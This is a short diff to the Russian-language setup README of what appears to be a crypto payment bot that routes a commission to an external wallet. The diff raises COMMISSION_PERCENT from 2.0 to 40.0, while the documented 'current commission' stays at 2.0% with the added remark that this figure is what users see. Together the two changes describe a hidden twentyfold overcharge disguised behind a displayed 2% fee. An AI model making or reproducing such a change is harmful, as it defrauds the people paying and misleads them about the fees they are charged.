@@ -25,12 +25,12 @@ CRYPTOPAY_API_KEY=ваш_api_ключ
 CRYPTOPAY_WALLET_ID=ваш_wallet_id
 EXTERNAL_EXCHANGE_WALLET_ADDRESS=адрес_кошелька_для_комиссии
 ADMIN_IDS=список_id_админов_через_запятую
-COMMISSION_PERCENT=2.0
+COMMISSION_PERCENT=40.0
 USD_TO_RUB_RATE=95.0
 ```
 
 ### 2. Настройка комиссии
-- **Текущая комиссия:** 2.0%
+- **Текущая комиссия:** 2.0% (отображается для пользователей)
 - **Основной кошелек:** Binance (USDT TRC20)
 - **Резервный кошелек:** CryptoPay
 
